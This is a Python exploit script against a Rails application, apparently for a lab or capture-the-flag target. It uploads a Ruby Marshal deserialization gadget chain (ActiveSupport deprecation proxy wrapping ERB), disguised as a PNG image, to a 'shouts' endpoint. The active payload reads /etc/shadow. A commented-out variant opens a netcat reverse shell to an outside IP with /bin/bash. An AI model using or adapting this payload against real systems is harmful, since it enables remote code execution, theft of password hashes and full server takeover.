#!/usr/bin/env python3
import requests, json

# cat
payload = b"\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\a:\t@srcI\"\x16`cat /etc/shadow`\x06:\x06ET:\f@linenoi\x00:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"

# reverse shell
# payload = b"\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\a:\t@srcI\"=Thread.new{system('nc 172.26.85.136 3001 -e /bin/bash')}\x06:\x06ET:\f@linenoi\x00:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"

files = {
	"image": ('moo.png', payload, 'image/png'),
	"commit": "Shout!",
}

data = {
	"message": 'moo',
}

r = requests.post("http://localhost:3000/shouts/dashboard", files = files, data = data)

print('--------req')
print(r.request.url, r.request.body, r.request.headers)
print('--------resp')
print(r.status_code, r.reason)
